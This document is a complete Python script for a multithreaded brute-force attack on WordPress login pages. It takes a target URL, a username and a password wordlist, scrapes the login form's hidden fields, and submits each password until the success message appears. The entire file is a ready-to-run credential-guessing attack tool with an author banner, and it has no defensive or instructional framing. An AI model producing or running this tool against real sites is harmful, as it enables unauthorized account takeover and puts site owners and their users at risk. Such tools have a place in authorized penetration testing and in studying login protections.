#!/usr/bin/env python3

import argparse
import requests
import sys
import threading
import time
from io import BytesIO
from lxml import etree
from queue import Queue

SUCCESS = 'Welcome to WordPress!'

# Function to print ASCII Art for the title
def print_ascii_art():
    print(r"""
  _    _______    _   _______ _      _      ___________        __  
 | |  | | ___ \  | | / /_   _| |    | |    |  ___| ___ \    _  \ \ 
 | |  | | |_/ /  | |/ /  | | | |    | |    | |__ | |_/ /   (_)  | |
 | |/\| | ___ \  |    \  | | | |    | |    |  __||    /         | |
 \  /\  / |_/ /  | |\  \_| |_| |____| |____| |___| |\ \     _   | |
  \/  \/\____/   \_| \_/\___/\_____/\_____/\____/\_| \_|   (_)  | |
                                                               /_/ 
                                                                   
             Made with ❤️ in Ukraine by Dandelion-18 :)
          """)

# Function to read words from a wordlist file
def get_words(wordlist):
    words = Queue()
    try:
        with open(wordlist, 'r') as f:
            raw_words = f.read()
        for word in raw_words.splitlines():
            words.put(word)
        return words
    except FileNotFoundError:
        print(f"[ERROR] Wordlist file not found: {wordlist}")
        sys.exit(1)
    except Exception as e:
        print(f"[ERROR] Failed to read wordlist file: {e}")
        sys.exit(1)

# Function to extract form parameters from the HTML response
def get_params(content):
    params = dict()
    parser = etree.HTMLParser()
    tree = etree.parse(BytesIO(content), parser=parser)
    for elem in tree.findall('.//input'):  # find all input elements
        name = elem.get('name')
        if name is not None:
            params[name] = elem.get('value', None)
    return params

# Bruter class for managing the brute-force attack
class Bruter:
    def __init__(self, username, url):
        self.username = username
        self.url = url
        self.found = False
        print(f'\n[INFO] Brute Force Attack starting on {url}.')
        print(f"[INFO] Targeted username: {self.username}\n")

    # Run brute-force attack with multiple threads
    def run_bruteforce(self, passwords, threads):
        print(f"[INFO] Starting {threads} threads for brute-forcing.")
        # Create threads
        for _ in range(threads):
            t = threading.Thread(target=self.web_bruter, args=(passwords,))
            t.daemon = True  # Daemonize thread so it exits when the main thread exits
            t.start()

        # Wait for all threads to complete
        while not passwords.empty() and not self.found:
            time.sleep(1)

    # Function to attempt brute-forcing on the website
    def web_bruter(self, passwords):
        session = requests.Session()
        try:
            resp0 = session.get(self.url)
            params = get_params(resp0.content)
            params['log'] = self.username  # Username parameter

            while not passwords.empty() and not self.found:
                passwd = passwords.get()
                print(f'[INFO] Trying username/password {self.username}/{passwd:<10}')
                params['pwd'] = passwd  # Password parameter

                resp1 = session.post(self.url, data=params)
                if SUCCESS in resp1.content.decode():
                    self.found = True
                    print(f"\n[INFO] Bruteforce successful!")
                    print(f"[INFO] Username: {self.username}")
                    print(f"[INFO] Password: {passwd}\n")
                    print('[INFO] Cleaning up other threads...')
                    break
        except requests.exceptions.RequestException as e:
            print(f"[ERROR] Error during brute-force attempt: {e}")

# Main function to handle arguments and run the brute-force attack
def main():
    # Print ASCII Art logo
    print_ascii_art()

    # Set up argument parser
    parser = argparse.ArgumentParser(description="A simple WordPress brute-force login tool.")
    parser.add_argument("url", help="The URL of the WordPress login page (e.g., http://example.com/wp-login.php)")
    parser.add_argument("username", help="The username to brute force")
    parser.add_argument("wordlist", help="Path to the wordlist file (e.g., /path/to/wordlist.txt)")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads to use (default: 10)")

    # Parse the arguments
    args = parser.parse_args()

    # Get words from the wordlist
    words = get_words(args.wordlist)
    
    # Create an instance of the Bruter class and start the brute-force attack
    bruter = Bruter(args.username, args.url)
    bruter.run_bruteforce(words, args.threads)

if __name__ == "__main__":
    main()
